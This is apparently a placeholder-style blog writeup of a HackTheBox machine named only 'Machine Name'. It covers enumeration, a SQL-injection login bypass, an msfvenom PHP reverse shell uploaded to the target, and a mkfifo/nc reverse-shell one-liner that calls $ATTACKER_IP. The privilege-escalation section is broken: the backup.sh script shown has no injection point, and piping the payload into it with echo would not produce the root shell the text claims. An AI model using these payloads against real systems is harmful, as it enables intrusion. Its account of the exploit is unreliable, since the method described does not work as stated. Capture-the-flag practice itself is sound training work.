---
title: "HackTheBox Writeup: Machine Name"
publishedAt: "2024-03-10"
summary: "A detailed walkthrough of solving the Machine Name box on HackTheBox, covering enumeration, exploitation, and privilege escalation."
tags: "security,hackthebox,pentest"
---

# HackTheBox Writeup: Machine Name

<Callout type="caution">
  This writeup contains spoilers for an active HTB machine. Please ensure you have already completed it or don't mind spoilers.
</Callout>

## Machine Overview

- **Difficulty**: Medium
- **OS**: Linux
- **Points**: 30
- **Release Date**: March 1, 2024

<ImageGrid
  images={[
    {
      src: "/blog/htb/machine-info.png",
      alt: "Machine Information Card"
    }
  ]}
/>

## Initial Enumeration

Let's start with a basic nmap scan: 
  
  ```bash
  nmap -sC -sV -oN nmap/initial $HTB_IP
  ```

The scan reveals two open ports: 22 (SSH) and 80 (HTTP). Let's check out the web server:

<ImageGrid
  images={[
    {
      src: "/blog/htb/web-server.png",
      alt: "Web Server Homepage"
    }
  ]}
/>

The homepage doesn't provide much information, so let's run a more thorough scan:

  ```bash
  gobuster dir -u http://$HTB_IP -w /usr/share/wordlists/dirb/common.txt -o gobuster/initial
  ```

The scan finds a `/admin` directory. Let's check it out:

<ImageGrid
  images={[
    {
      src: "/blog/htb/admin-page.png",
      alt: "Admin Page"
    }
  ]}
/>

The admin page contains a login form. Let's try some common credentials.

Username | Password
--- | ---
admin | admin
admin | password
admin | 123456

None of the common credentials work. Let's try to find more information.

## User Exploitation

The `/admin` page contains a login form. Let's try to bypass it using SQL injection:

```sql
' OR 1=1 --
```

The SQL injection bypasses the login and we get access to the admin panel. We find a file upload form that accepts image files. Let's try to upload a reverse shell:

```bash
msfvenom -p php/reverse_php LHOST=$ATTACKER_IP LPORT=4444 -f raw > shell.php
```

Upload the `shell.php` file and start a listener:

```bash
nc -lvnp 4444
```

Trigger the reverse shell by accessing the uploaded file:

```bash
http://$HTB_IP/uploads/shell.php
```

We get a reverse shell as the `www-data` user. Let's escalate to a more privileged user.

## Privilege Escalation

We find a `backup.sh` script in the `/var/www` directory. The script is running as root and contains a command injection vulnerability:

```bash
echo "Backup started"
tar -czf /var/backups/backup-$(date +%Y%m%d).tar.gz /var/www
echo "Backup finished"
```

Let's exploit the command injection vulnerability to get a root shell:

```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ATTACKER_IP 4444 >/tmp/f" | /var/www/backup.sh
```

We get a root shell and capture the root flag. The box is now fully compromised!

<ImageGrid
  images={[
    {
      src: "/blog/htb/root-flag.png",
      alt: "Root Flag"
    }
  ]}
/>
```